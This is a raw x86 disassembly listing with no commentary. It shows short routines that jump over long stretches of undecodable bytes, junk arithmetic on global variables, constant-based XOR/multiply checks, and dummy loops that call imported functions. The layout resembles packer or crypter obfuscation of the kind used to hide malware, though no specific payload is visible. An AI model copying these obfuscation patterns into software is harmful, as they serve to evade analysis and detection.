  40418c:	(bad)  
  40418d:	ficomp DWORD PTR [edx-0x25fb006d]
  404193:	in     al,0xfa
  404195:	lea    eax,[eax+edx*1+0x32729b]
  40419c:	mov    DWORD PTR [ebp+0x8],eax
  40419f:	inc    DWORD PTR [ebp+0xc]
  4041a2:	jmp    0x403a0a
  4041a7:	mov    eax,DWORD PTR [ebp-0x10]
  4041aa:	xor    eax,ecx
  4041ac:	mov    ecx,DWORD PTR [ebp+0x10]
  4041af:	add    eax,esi
  4041b1:	mov    DWORD PTR [ecx],eax
  4041b3:	pop    esi
  4041b4:	leave  
  4041b5:	ret    0xc
  4041b8:	push   ebp
  4041b9:	mov    ebp,esp
  4041bb:	push   ecx
  4041bc:	push   ecx
  4041bd:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4041c4:	jmp    0x404388
  4041c9:	call   0xb2b3:0xa7939f83
  4041d0:	mov    bl,0x67
  4041d2:	ja     0x4041f1
  4041d4:	pop    esp
  4041d5:	stos   DWORD PTR es:[edi],eax
  4041d6:	or     ecx,esi
  4041d8:	dec    esp
  4041d9:	push   edx
  4041da:	sbb    edi,DWORD PTR [esi+0x7e]
  4041dd:	cdq    
  4041de:	jg     0x40425e
  4041e0:	jle    0x404250
  4041e2:	fiadd  WORD PTR [eax+edi*4+0x5d]
  4041e6:	jmp    0x61f7:0xad28e245
  4041ed:	pop    ebp
  4041ee:	cmp    DWORD PTR [ebx],edi
  4041f0:	clc    
  4041f1:	or     al,0x22
  4041f3:	cmp    esi,DWORD PTR [edi-0x3a]
  4041f6:	stc    
  4041f7:	jo     0x4041e7
  4041f9:	xor    al,0x26
  4041fb:	ja     0x4041f0
  4041fd:	xlat   BYTE PTR ds:[ebx]
  4041fe:	test   BYTE PTR [edi-0x321487d2],bh
  404204:	adc    BYTE PTR ds:0x46117bf7,bl
  40420a:	fst    DWORD PTR [ecx+0x37]
  40420d:	dec    ebp
  40420e:	jmp    0xc2da524c
  404213:	jmp    0x4041ea
  404215:	xor    BYTE PTR [ecx+0x420991fe],0xa0
  40421c:	sti    
  40421d:	push   ebx
  40421e:	inc    edx
  40421f:	pop    edx
  404220:	nop
  404221:	nop
  404222:	or     esi,DWORD PTR [edi+0x373f3a56]
  404228:	pop    ebx
  404229:	xlat   BYTE PTR ds:[ebx]
  40422a:	stc    
  40422b:	push   ebp
  40422c:	or     al,bl
  40422e:	cwde   
  40422f:	cmp    BYTE PTR [ecx+edi*8-0x59],ah
  404233:	dec    ecx
  404234:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404235:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404236:	inc    eax
  404237:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404238:	setne  BYTE PTR [eax+0x25a1e0f3]
  40423f:	je     0x404282
  404241:	inc    esp
  404242:	adc    eax,edx
  404244:	icebp  
  404245:	jp     0x404247
  404247:	lods   al,BYTE PTR ds:[esi]
  404248:	jg     0x4041fc
  40424a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40424b:	ret    
  40424c:	xor    DWORD PTR [ecx+0x21262098],0x44a14054
  404256:	xchg   DWORD PTR [ebx],edi
  404258:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404259:	in     eax,0x7e
  40425b:	leave  
  40425c:	sbb    al,0x31
  40425e:	jb     0x40428f
  404260:	popa   
  404261:	xchg   edi,eax
  404262:	bound  esi,QWORD PTR [ebx]
  404264:	cld    
  404265:	mov    dl,0xb8
  404267:	jl     0x404280
  404269:	ret    0x1ba1
  40426c:	imul   edi,DWORD PTR ss:[edx+ebx*1],0x363aa894
  404274:	push   ebx
  404275:	sbb    eax,0x6f3753e2
  40427a:	ror    DWORD PTR [ebp+0x56],1
  40427d:	stc    
  40427e:	mov    ebp,0xd9f8f309
  404283:	enter  0xae15,0xc1
  404287:	cld    
  404288:	fcomip st,st(1)
  40428a:	shr    esi,0x4b
  40428d:	xchg   esp,eax
  40428e:	iret   
  40428f:	mov    eax,0x9877706b
  404294:	mov    edi,0xb6f38769
  404299:	aas    
  40429a:	icebp  
  40429b:	mov    ah,0xef
  40429d:	sbb    dl,BYTE PTR [ebx-0x3dd8373a]
  4042a3:	lods   eax,DWORD PTR ds:[esi]
  4042a4:	xor    DWORD PTR [ebp-0x7d4d2dd0],eax
  4042aa:	dec    ebp
  4042ab:	js     0x4042dc
  4042ad:	xchg   ebx,eax
  4042ae:	daa    
  4042af:	outs   dx,DWORD PTR ds:[esi]
  4042b0:	mov    bh,0x9d
  4042b2:	pop    esp
  4042b3:	mov    ebx,0x66b6544a
  4042b8:	mov    bh,0x23
  4042ba:	dec    ecx
  4042bb:	add    BYTE PTR [eax+eiz*2+0x5f],bh
  4042bf:	inc    ecx
  4042c0:	call   FWORD PTR [esi]
  4042c2:	mov    eax,0xa46f290b
  4042c7:	mov    dl,BYTE PTR [esp+esi*1-0x5da8c8f2]
  4042ce:	mov    ch,al
  4042d0:	test   al,0xff
  4042d2:	or     eax,DWORD PTR [ebx-0x31]
  4042d5:	call   0x32ddee41
  4042da:	pop    ecx
  4042db:	test   BYTE PTR [ebp+0x32507f96],0x4f
  4042e2:	push   eax
  4042e3:	dec    esi
  4042e4:	lea    eax,[edx-0x15a83d14]
  4042ea:	fmul   DWORD PTR [esp+ebx*2]
  4042ed:	test   BYTE PTR [eax-0x5625d297],0xf6
  4042f4:	xor    bh,ah
  4042f6:	retf   0x5145
  4042f9:	sub    ch,BYTE PTR [edi+ebp*8-0x45]
  4042fd:	and    DWORD PTR [esi-0x40a81b72],0x2b99e85f
  404307:	sub    bh,bl
  404309:	dec    edx
  40430a:	(bad)  
  40430b:	pop    eax
  40430c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40430d:	retf   0xa1e4
  404310:	(bad)  
  404312:	mov    eax,0x935ac217
  404317:	fbld   TBYTE PTR [edx]
  404319:	(bad)  
  40431a:	lods   eax,DWORD PTR ds:[esi]
  40431b:	cmp    al,0x7a
  40431d:	or     DWORD PTR [ebx+0x68],0xffffffa5
  404321:	mov    dh,0xf2
  404323:	fsincos 
  404325:	jg     0x4042f5
  404327:	xchg   esp,eax
  404328:	xor    bl,ch
  40432a:	rep stos DWORD PTR es:[edi],eax
  40432c:	mov    bl,0xcd
  40432e:	enter  0xb664,0xa2
  404332:	test   al,0xef
  404334:	dec    ebx
  404335:	sub    al,0xce
  404337:	ror    BYTE PTR [esi-0x5d],cl
  40433a:	stos   DWORD PTR es:[edi],eax
  40433b:	mov    dl,0x53
  40433d:	cmp    edi,DWORD PTR [edi+0x54]
  404340:	or     al,0xba
  404342:	(bad)  
  404343:	loopne 0x404394
  404345:	test   al,0xdb
  404347:	test   eax,0xd62e3bcb
  40434d:	inc    ebx
  40434e:	(bad)  
  40434f:	scas   al,BYTE PTR es:[edi]
  404350:	in     eax,dx
  404351:	mov    al,ds:0x36527b15
  404356:	in     eax,0xbe
  404358:	adc    BYTE PTR [eax-0x1165a68f],ch
  40435e:	popa   
  40435f:	pop    DWORD PTR [ebx]
  404361:	xor    al,0xbc
  404363:	cmp    DWORD PTR [edx-0x3d],ecx
  404366:	dec    edi
  404367:	sbb    al,0x7a
  404369:	dec    esi
  40436a:	pop    ebp
  40436b:	repz push edx
  40436d:	in     al,dx
  40436e:	inc    esp
  40436f:	inc    ecx
  404370:	mov    esp,0xc4d63dec
  404375:	int3   
  404376:	sub    edi,esp
  404378:	adc    DWORD PTR [esi+edi*4-0x3e],eax
  40437c:	loop   0x4043d6
  40437e:	mov    ebx,DWORD PTR [ebp+esi*4-0xf]
  404382:	and    esi,DWORD PTR [ebx+0x318f6790]
  404388:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40438f:	mov    eax,DWORD PTR [ebp-0x4]
  404392:	push   esi
  404393:	or     DWORD PTR ds:0x42edef,0x42e7c0
  40439d:	mov    esi,DWORD PTR [ebp-0x8]
  4043a0:	and    DWORD PTR ds:0x42ede7,edi
  4043a6:	mov    edx,0x7510854
  4043ab:	or     DWORD PTR ds:0x430435,0x1aa0
  4043b5:	xor    eax,edx
  4043b7:	add    DWORD PTR ds:0x42edef,0x430435
  4043c1:	xor    esi,edx
  4043c3:	mov    ecx,0x32729b
  4043c8:	or     DWORD PTR ds:0x4304df,0x42e7c8
  4043d2:	add    esi,ecx
  4043d4:	add    eax,ecx
  4043d6:	sub    DWORD PTR ds:0x42e7cc,0x70e
  4043e0:	imul   eax,esi
  4043e3:	mov    esi,0x43d2
  4043e8:	mov    esi,DWORD PTR [ebp+0xc]
  4043eb:	cmp    esi,eax
  4043ed:	jne    0x4045f5
  4043f3:	mov    eax,DWORD PTR [ebp-0x4]
  4043f6:	mov    esi,DWORD PTR [ebp-0x8]
  4043f9:	xor    DWORD PTR ds:0x42ede3,0x42edeb
  404403:	xor    eax,edx
  404405:	and    DWORD PTR ds:0x42edeb,0x3e0c
  40440f:	xor    esi,edx
  404411:	xor    DWORD PTR ds:0x43044d,0x798f
  40441b:	jmp    0x4045df
  404420:	jbe    0x40448b
  404422:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404423:	adc    eax,0x6974d1a1
  404428:	sahf   
  404429:	es push 0x79
  40442c:	lahf   
  40442d:	bound  edx,QWORD PTR [edx]
  40442f:	dec    ebp
  404430:	std    
  404431:	sbb    DWORD PTR [esi+0x7e],edi
  404434:	cdq    
  404435:	jg     0x4044b5
  404437:	jle    0x40448a
  404439:	jo     0x404400
  40443b:	and    ah,BYTE PTR [ebp+0x67]
  40443e:	jae    0x4044a8
  404440:	cmp    al,al
  404442:	mov    ds:0x25ae579f,eax
  404447:	shl    ah,0x77
  40444a:	mov    eax,ds:0xa746c5bf
  40444f:	cdq    
  404450:	int    0x8f
  404452:	es and eax,0xba630497
  404458:	jbe    0x404459
  40445a:	sbb    ebx,0xffffffba
  40445d:	(bad)  
  40445e:	ror    DWORD PTR [eax+ebp*4-0x31],cl
  404462:	jo     0x4043ef
  404464:	loopne 0x4043f8
  404466:	rcl    DWORD PTR [eax-0x11],1
  404469:	xchg   esp,eax
  40446a:	(bad)  
  40446c:	stos   DWORD PTR es:[edi],eax
  40446d:	repz pop es
  40446f:	mov    BYTE PTR [esi],bh
  404471:	bound  eax,QWORD PTR [ebp+0x7f]
  404474:	or     al,0xf0
  404476:	ja     0x40447d
  404478:	inc    edi
  404479:	in     eax,dx
  40447a:	aaa    
  40447b:	fs dec eax
  40447d:	dec    eax
  40447e:	adc    al,0x1b
  404480:	aam    0xcc
  404482:	shl    BYTE PTR [esi+0x43],1
  404485:	xor    dh,BYTE PTR [ebx]
  404487:	popa   
  404488:	ins    BYTE PTR es:[edi],dx
  404489:	ja     0x4044d0
  40448b:	imul   eax
  40448d:	inc    esp
  40448e:	imul   ecx,DWORD PTR [ebx],0x8d0085b2
  404494:	or     al,0xc4
  404496:	call   0x53e7:0xfd0a3525
  40449d:	es jns 0x404505
  4044a0:	aaa    
  4044a1:	or     eax,DWORD PTR [esi]
  4044a3:	test   BYTE PTR [ebx+0x44bf488c],dl
  4044a9:	mov    bl,BYTE PTR [edi-0x1d891ca4]
  4044af:	ret    0x31d5
  4044b2:	or     bh,BYTE PTR [esi+0x13359e3c]
  4044b8:	lds    ebp,FWORD PTR ds:0xfa5612b0
  4044be:	jecxz  0x4044e0
  4044c0:	int    0x94
  4044c2:	inc    esi
  4044c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044c4:	lods   eax,DWORD PTR ds:[esi]
  4044c5:	xchg   esi,eax
  4044c6:	dec    esp
  4044c7:	sub    dl,BYTE PTR [ebx+0x1027305e]
  4044cd:	sbb    edx,edi
  4044cf:	pop    ebx
  4044d0:	xor    bh,BYTE PTR [edi-0x3229bbb9]
  4044d6:	mov    DWORD PTR [edi+0x60fae2d8],esp
  4044dc:	call   0x352c3aa8
  4044e1:	mov    eax,DWORD PTR [eax+0x793174c1]
  4044e7:	cmc    
  4044e8:	repnz or BYTE PTR [edi-0x76619487],dl
  4044ef:	mov    ch,BYTE PTR [ebp-0x7e2aaea9]
  4044f5:	adc    BYTE PTR [ebp+0x209f8853],ch
  4044fb:	cmp    al,cl
  4044fd:	pop    eax
  4044fe:	sbb    BYTE PTR [eax+0x7f],dh
  404501:	mov    edi,0xc66b879f
  404506:	push   0x943192a6
  40450b:	in     eax,0x81
  40450d:	jmp    0x5c49:0x96d0e7b
  404514:	ds sbb ax,0xeef6
  404519:	cmp    eax,0x8a2edc54
  40451e:	mov    esi,0xea0623ae
  404523:	stc    
  404524:	mov    bl,0x6
  404526:	arpl   WORD PTR [ebp+0x2c],ax
  404529:	xchg   BYTE PTR [edi+0xd0ece44],ah
  40452f:	jp     0x4044cc
  404531:	sbb    DWORD PTR [ebp-0x26f82054],edi
  404537:	cmp    ebp,DWORD PTR [ecx+edx*1+0x18f802a8]
  40453e:	repnz adc DWORD PTR [eax+0x5e],edi
  404542:	je     0x404523
  404544:	pop    edi
  404545:	xchg   ebx,eax
  404546:	or     edi,edx
  404548:	lods   al,BYTE PTR ds:[esi]
  404549:	icebp  
  40454a:	cmp    eax,0xe89dac73
  40454f:	jmp    0x61ee:0x4b1aa156
  404556:	fidiv  WORD PTR ds:0x944ced32
  40455c:	gs or  eax,0xb7da9848
  404562:	mov    ecx,0x2bfc4152
  404567:	adc    eax,0xe2628d77
  40456c:	retf   0x969c
  40456f:	ds hlt 
  404571:	lea    edi,[ecx+0x16]
  404574:	push   cs
  404575:	ins    BYTE PTR es:[edi],dx
  404576:	pop    es
  404577:	cmp    eax,0xcb83a215
  40457c:	rcr    dl,1
  40457e:	mov    WORD PTR [ebx-0x38],es
  404581:	icebp  
  404582:	das    
  404583:	and    ebx,DWORD PTR [ecx-0x508b7993]
  404589:	scas   eax,DWORD PTR es:[edi]
  40458a:	rol    BYTE PTR [esi+0x34be5bd9],cl
  404590:	push   esp
  404591:	dec    ebp
  404592:	icebp  
  404593:	test   BYTE PTR [edx+edx*8-0x3f],ah
  404597:	mov    edi,0xe00ba450
  40459c:	jl     0x404573
  40459e:	inc    esp
  40459f:	xor    BYTE PTR [eax-0x7e],al
  4045a2:	pop    esp
  4045a3:	cwde   
  4045a4:	(bad)  
  4045a5:	jb     0x4045b0
  4045a7:	pushf  
  4045a8:	jge    0x404600
  4045aa:	test   eax,0xf1e447ee
  4045af:	es jmp 0x1525:0xa0168835
  4045b7:	stos   DWORD PTR es:[edi],eax
  4045b8:	mov    DWORD PTR [ebx+edi*4-0x3a038450],ebp
  4045bf:	(bad)  
  4045c1:	jmp    0x404560
  4045c3:	aad    0x71
  4045c5:	push   cs
  4045c6:	push   es
  4045c7:	bound  edi,QWORD PTR [eax-0x34396c60]
  4045cd:	jg     0x40459d
  4045cf:	adc    eax,0xa6f296ba
  4045d4:	xchg   edx,eax
  4045d5:	and    DWORD PTR [edi],esi
  4045d7:	scas   eax,DWORD PTR es:[edi]
  4045d8:	in     eax,0x9d
  4045da:	push   esi
  4045db:	loope  0x4045f8
  4045dd:	icebp  
  4045de:	loope  0x4045e3
  4045e0:	rol    DWORD PTR [ebx],0xf1
  4045e3:	imul   eax,esi
  4045e6:	mov    DWORD PTR ds:0x4304e7,0x2c81
  4045f0:	jmp    0x4046a8
  4045f5:	and    DWORD PTR ds:0x430439,0x0
  4045ff:	jmp    0x404612
  404604:	xor    eax,eax
  404606:	xor    eax,DWORD PTR ds:0x430439
  40460c:	inc    eax
  40460d:	mov    ds:0x430439,eax
  404612:	cmp    DWORD PTR ds:0x430439,0x18
  404619:	jae    0x40466d
  40461f:	cmp    DWORD PTR ds:0x430439,0xd
  404626:	jne    0x404650
  40462c:	push   0x4871
  404631:	push   0x7618
  404636:	push   0x847f
  40463b:	push   DWORD PTR [ebp-0x1c]
  40463e:	push   DWORD PTR [ebp-0xc]
  404641:	push   DWORD PTR [ebp-0x14]
  404644:	push   DWORD PTR [ebp-0x10]
  404647:	push   DWORD PTR [ebp-0x10]
  40464a:	call   DWORD PTR ds:0x42ec13
  404650:	cmp    DWORD PTR ds:0x430439,0xc
  404657:	jne    0x404668
  40465d:	mov    eax,ds:0x430439
  404662:	inc    eax
  404663:	mov    ds:0x430439,eax
  404668:	jmp    0x404604
  40466d:	mov    eax,DWORD PTR [ebp+0xc]
  404670:	mov    eax,DWORD PTR [eax+0x78]
  404673:	mov    DWORD PTR [ebp+0xc],eax
  404676:	mov    eax,DWORD PTR [ebp-0x4]
  404679:	mov    esi,DWORD PTR [ebp-0x8]
  40467c:	xor    eax,edx
  40467e:	xor    esi,edx
  404680:	add    eax,ecx
  404682:	add    esi,ecx
  404684:	imul   eax,esi
  404687:	mov    esi,DWORD PTR [ebp+0xc]
  40468a:	cmp    esi,eax
  40468c:	mov    eax,DWORD PTR [ebp-0x4]
  40468f:	je     0x4043f6
  404695:	xor    eax,edx
  404697:	add    eax,ecx
  404699:	mov    ecx,DWORD PTR [ebp+0xc]
  40469c:	imul   eax,ecx
  40469f:	add    eax,DWORD PTR [ebp+0x8]
  4046a2:	mov    DWORD PTR [ebp+0xc],eax
  4046a5:	mov    eax,DWORD PTR [ebp+0xc]
  4046a8:	pop    esi
  4046a9:	leave  
  4046aa:	ret    0x8
  4046ad:	push   ebp
  4046ae:	mov    ebp,esp
  4046b0:	push   ecx
  4046b1:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  4046b8:	mov    DWORD PTR ds:0x42edd3,0x122d
  4046c2:	mov    eax,DWORD PTR [ebp-0x4]
  4046c5:	mov    edx,DWORD PTR [ebp+0x10]
  4046c8:	mov    ecx,0x7510854
  4046cd:	sbb    DWORD PTR ds:0x430439,0x430471
  4046d7:	xor    eax,ecx
  4046d9:	sub    DWORD PTR ds:0x43045d,0x42eddb
  4046e3:	add    eax,0x32729b
  4046e8:	jmp    0x4049a4
  4046ed:	fnstenv [eax+0x4]
  4046f0:	loop   0x404687
  4046f2:	jb     0x4046cd
  4046f4:	jno    0x40470f
  4046f6:	in     eax,0x6e
  4046f8:	jne    0x404776
  4046fa:	push   ebx
  4046fb:	pop    esi
  4046fc:	xor    BYTE PTR [edi+eiz*1],ah
  4046ff:	jle    0x40477f
  404701:	xchg   ecx,eax
  404702:	jl     0x404782
  404704:	jle    0x404693
  404706:	push   ecx
  404707:	mov    eax,0x76ecc145
  40470c:	push   esp
  40470d:	cld    
  40470e:	in     al,0xb0
  404710:	jl     0x404727
  404712:	dec    eax
  404713:	cs retf 
  404715:	pop    esp
  404716:	ror    ecx,1
  404718:	and    eax,DWORD PTR [esi+0x277aefc6]
  40471e:	fwait
  40471f:	and    esp,DWORD PTR [edi+ebx*1]
  404722:	repnz cmp ah,BYTE PTR [esi+edx*2+0x13]
  404727:	hlt    
  404728:	retf   0xd70f
  40472b:	in     al,0x79
  40472d:	mov    ch,0x3
  40472f:	adc    BYTE PTR [edi+0x71],cl
  404732:	jne    0x40475a
  404734:	sub    BYTE PTR cs:[ecx-0x20c491a8],0xd9
  40473c:	pop    DWORD PTR gs:[eax-0x55]
  404740:	pushf  
  404741:	mov    dl,0xaa
  404743:	ret    0x868f
  404746:	push   ds
  404747:	ins    BYTE PTR es:[edi],dx
  404748:	add    BYTE PTR [eax+0x76],ah
  40474b:	arpl   WORD PTR [ebp-0x33],cx
  40474e:	push   edi
  40474f:	or     DWORD PTR [eax-0x40],edx
  404752:	cmp    BYTE PTR [ebx],ch
  404754:	fiadd  WORD PTR [edi-0x6b]
  404757:	shr    BYTE PTR [edi-0x15],0xd1
  40475b:	xchg   edx,eax
  40475c:	add    ah,BYTE PTR [ebx+0x4f]
  40475f:	dec    ebx
  404760:	lods   eax,DWORD PTR ds:[esi]
  404761:	push   0xffffffa9
  404763:	cmp    al,0x22
  404765:	fs xchg ecx,eax
  404767:	dec    edx
  404768:	pop    edx
  404769:	in     eax,0xb2
  40476b:	neg    BYTE PTR [ebx]
  40476d:	inc    eax
  40476e:	xchg   edi,eax
  40476f:	mov    dh,0x93
  404771:	and    edx,DWORD PTR [esp+eiz*8-0x7bac431]
  404778:	(bad)  
  404779:	pop    esp
  40477a:	xchg   esp,eax
  40477b:	ret    
  40477c:	pop    esi
  40477d:	mov    ds:0xc61c86ff,al
  404782:	jmp    0x404755
  404784:	or     bl,BYTE PTR [edi-0x19d22c84]
  40478a:	cli    
  40478b:	cmp    BYTE PTR [ebp+ebp*8+0x40948f91],cl
  404792:	and    al,ch
  404794:	pop    esp
  404795:	imul   esp,DWORD PTR [eax-0x7f],0xfffffff6
  404799:	loopne 0x404734
  40479b:	push   cs
  40479c:	pop    ecx
  40479d:	rol    DWORD PTR [edx+0x50],1
  4047a0:	pop    esp
  4047a1:	jae    0x4047d9
  4047a3:	ins    DWORD PTR es:[edi],dx
  4047a4:	repnz addr16 mov ah,0xbb
  4047a8:	iret   
  4047a9:	inc    ebp
  4047aa:	stc    
  4047ab:	push   ds
  4047ac:	mov    DWORD PTR [edi-0x4e],edx
  4047af:	mov    ecx,DWORD PTR [ecx+edx*4-0x9b65a7]
  4047b6:	inc    esp
  4047b7:	rcl    DWORD PTR [ebx-0x17e3857f],cl
  4047bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047be:	pop    DWORD PTR [edi-0x5933783f]
  4047c4:	mov    esp,0xab250ef0
  4047c9:	test   al,0xe8
  4047cb:	pop    esp
  4047cc:	std    
  4047cd:	int3   
  4047ce:	out    0xa0,al
  4047d0:	add    cl,BYTE PTR [ecx+0x58]
  4047d3:	arpl   WORD PTR ds:0x43ed9410,sp
  4047d9:	xchg   ebx,eax
  4047da:	jb     0x404781
  4047dc:	jbe    0x4047eb
  4047de:	mov    al,0x34
  4047e0:	call   0xbec:0x4ee75627
  4047e7:	cs mov esp,0x74818e50
  4047ed:	fiadd  DWORD PTR [ecx+0x7f]
  4047f0:	adc    BYTE PTR [edx+0x28],0x88
  4047f4:	test   BYTE PTR [ebp-0x4f],cl
  4047f7:	ror    BYTE PTR [ebp-0x59],1
  4047fa:	enter  0xd93f,0x6f
  4047fe:	(bad)  
  4047ff:	loop   0x404858
  404801:	add    DWORD PTR [ebp+esi*8-0x4c],edx
  404805:	(bad)  
  404806:	sbb    DWORD PTR [esi-0x6e364e12],ebx
  40480c:	hlt    
  40480d:	mov    ds:0xe185f03f,al
  404812:	adc    bl,al
  404814:	and    eax,0xc23dea6e
  404819:	mov    bh,0x35
  40481b:	lods   al,BYTE PTR ds:[esi]
  40481c:	jmp    0x564fb984
  404821:	popa   
  404822:	inc    ecx
  404823:	push   0xba2976f3
  404828:	jmp    0x83c9:0xb6db1741
  40482f:	sub    ebp,DWORD PTR [edx]
  404831:	xchg   ecx,eax
  404832:	and    al,0xdc
  404834:	scas   eax,DWORD PTR es:[edi]
  404835:	shl    DWORD PTR [ebx-0x7932f559],1
  40483b:	inc    ebp
  40483c:	mov    dl,0x8a
  40483e:	or     ecx,esp
  404840:	jl     0x40488e
  404842:	stos   BYTE PTR es:[edi],al
  404843:	fcomp  DWORD PTR [edx]
  404845:	out    0x23,eax
  404847:	xor    eax,0x97a346c2
  40484c:	xor    DWORD PTR [ebx-0xe4c8f00],edx
  404852:	mov    al,ds:0xab4ae2e
  404857:	cmp    DWORD PTR [ebp-0x40],ebp
  40485a:	sbb    ebp,ecx
  40485c:	js     0x40485b
  40485e:	nop
  40485f:	aam    0x8f
  404861:	sub    dh,BYTE PTR [edi+0x43]
  404864:	imul   ecx,DWORD PTR [edi],0xfffffffe
  404867:	outs   dx,BYTE PTR ds:[esi]
  404868:	sbb    BYTE PTR [ecx-0x4d807145],dl
  40486e:	fadd   st(0),st
  404870:	stos   BYTE PTR es:[edi],al
  404871:	enter  0xa71a,0xfd
  404875:	and    ebp,esi
  404877:	lahf   
  404878:	fstp   DWORD PTR [ecx+0x6fd69b87]
  40487e:	sub    dh,BYTE PTR [eax+edx*2+0x6cc35158]
  404885:	jp     0x40485e
  404887:	ror    DWORD PTR [eax+0x4d],0x44
  40488b:	mov    fs:0x1675667a,eax
  404891:	jg     0x4048ee
  404893:	mov    edi,0x4ef06deb
  404898:	xchg   edx,eax
  404899:	inc    esi
  40489a:	adc    al,0xb2
  40489c:	jg     0x404858
  40489e:	sub    edx,edx
  4048a0:	push   edi
  4048a1:	in     al,0x3e
  4048a3:	outs   dx,DWORD PTR ds:[esi]
  4048a4:	push   cs
  4048a5:	ret    
  4048a6:	sbb    eax,0x8f3064d5
  4048ab:	jbe    0x4048b7
  4048ad:	mov    ebp,0x651d63ca
  4048b2:	retf   0x3e61
  4048b5:	sub    DWORD PTR [edi],esi
  4048b7:	jg     0x40488c
  4048b9:	js     0x404933
  4048bb:	aaa    
  4048bc:	dec    ecx
  4048bd:	jae    0x4048d3
  4048bf:	popf   
  4048c0:	jns    0x40484a
  4048c2:	aaa    
  4048c3:	std    
  4048c4:	and    edx,DWORD PTR [esi-0x18]
  4048c7:	and    eax,0x904d1548
  4048cc:	cmp    eax,0x2efd74ff
  4048d1:	or     DWORD PTR [eax+0x3f],esi
  4048d4:	add    DWORD PTR [esi-0x5d],0xfb640b58
  4048db:	push   ss
  4048dc:	mov    al,ds:0x48f8cc29
  4048e1:	adc    BYTE PTR [esi],al
  4048e3:	and    al,0x7b
  4048e5:	int    0x3a
  4048e7:	aaa    
  4048e8:	clc    
  4048e9:	mov    esi,eax
  4048eb:	test   dh,0xe2
  4048ee:	jmp    0x4048d4
  4048f0:	jne    0x40495c
  4048f2:	retf   0x489d
  4048f5:	push   es
  4048f6:	jecxz  0x4048c7
  4048f8:	test   BYTE PTR [esi+0x27e3f4a],ch
  4048fe:	pop    esi
  4048ff:	int    0x79
  404901:	xchg   bl,ch
  404903:	xor    ah,dh
  404905:	int3   
  404906:	xor    ah,BYTE PTR [eax-0x4b]
  404909:	mov    ds:0x68c93529,eax
  40490e:	and    al,0x73
  404910:	ins    BYTE PTR es:[edi],dx
  404911:	add    dl,ah
  404913:	pop    esp
  404914:	xchg   ebp,eax
  404915:	push   ebp
  404916:	mov    esp,0xd5bd282c
  40491b:	jnp    0x404984
  40491d:	arpl   cx,bx
  40491f:	xor    al,0xba
  404921:	add    bl,bh
  404923:	mov    ah,0x1c
  404925:	pop    ds
  404926:	(bad)  
  404927:	mov    edx,0x1cff9b4c
  40492c:	scas   eax,DWORD PTR es:[edi]
  40492d:	xor    edx,edx
  40492f:	cmp    dh,0x93
  404932:	fucomp st(1)
  404934:	push   0x3550ca67
  404939:	mov    cs,WORD PTR [eax]
  40493b:	or     al,0x55
  40493d:	rol    DWORD PTR [eax+edx*8],cl
  404940:	popa   
  404941:	or     bl,BYTE PTR [eax-0x43]
  404944:	or     al,BYTE PTR [esi]
  404946:	pop    esi
  404947:	dec    edi
  404948:	cli    
  404949:	xor    al,0xfd
  40494b:	mov    cl,0x42
  40494d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40494e:	int    0x57
  404950:	adc    al,0x80
  404952:	add    eax,0xe052977d
  404957:	push   ebp
  404958:	out    dx,eax
  404959:	inc    ebx
  40495a:	repz mov ecx,0x142b2b02
  404960:	sbb    DWORD PTR [ecx],esi
  404962:	xchg   esp,eax
  404963:	lods   eax,DWORD PTR ds:[esi]
  404964:	or     edx,DWORD PTR [ebp-0x76]
  404967:	mov    ah,0xce
  404969:	inc    edi
  40496a:	stos   DWORD PTR es:[edi],eax
  40496b:	cmp    cl,BYTE PTR [edi-0x66c3e213]
  404971:	mov    ebx,0xfd48cc3d
  404976:	push   0xffffffdd
  404978:	(bad)  
  404979:	(bad)  [ebp+0x21]
  40497c:	push   0x2a59b7ab
  404981:	mov    cl,0xa1
  404983:	jbe    0x40492f
  404985:	pop    esp
  404986:	mov    eax,ds:0x7be653c5
  40498b:	dec    esi
  40498c:	pop    ss
  40498d:	mov    dh,0x5
  40498f:	lock fcomip st,st(6)
  404992:	sbb    DWORD PTR [esi+0x7e629e2b],0xc8cfc8af
  40499c:	add    eax,0xeebd3825
  4049a1:	cs inc esi
  4049a3:	fwait
  4049a4:	mov    DWORD PTR [edx],eax
  4049a6:	and    DWORD PTR ds:0x42e7d8,0x0
  4049b0:	xor    edx,edx
  4049b2:	xor    edx,DWORD PTR ds:0x42e7d8
  4049b8:	inc    edx
  4049b9:	mov    DWORD PTR ds:0x42e7d8,edx
  4049bf:	cmp    DWORD PTR ds:0x42e7d8,0xd
  4049c6:	jne    0x4049da
  4049cc:	push   0x1
  4049ce:	push   DWORD PTR [ebp-0x18]
  4049d1:	push   DWORD PTR [ebp-0xc]
  4049d4:	call   DWORD PTR ds:0x42e9cf
  4049da:	cmp    DWORD PTR ds:0x42e7d8,0xc
  4049e1:	jne    0x4049f4
  4049e7:	mov    edx,DWORD PTR ds:0x42e7d8
  4049ed:	inc    edx
  4049ee:	mov    DWORD PTR ds:0x42e7d8,edx
  4049f4:	cmp    DWORD PTR ds:0x42e7d8,0x1c
  4049fb:	jb     0x4049b0
  404a01:	sub    DWORD PTR ds:0x42edeb,ebx
  404a07:	mov    eax,DWORD PTR [ebp+0xc]
  404a0a:	xor    eax,ecx
  404a0c:	xor    DWORD PTR ds:0x4304cf,ecx
  404a12:	push   esi
  404a13:	mov    esi,DWORD PTR [ebp+0x10]
  404a16:	add    DWORD PTR ds:0x42ede7,0x6bf6
  404a20:	mov    edx,0x32729b
  404a25:	sbb    DWORD PTR ds:0x4304e3,0x4304df
  404a2f:	add    eax,edx
  404a31:	add    DWORD PTR ds:0x42ede7,0x26eb
  404a3b:	mov    DWORD PTR [esi+0x4],eax
  404a3e:	adc    eax,DWORD PTR ds:0x4304db
  404a44:	mov    eax,DWORD PTR [ebp+0x14]
  404a47:	mov    esi,DWORD PTR [ebp+0x10]
  404a4a:	mov    DWORD PTR [esi+0x8],eax
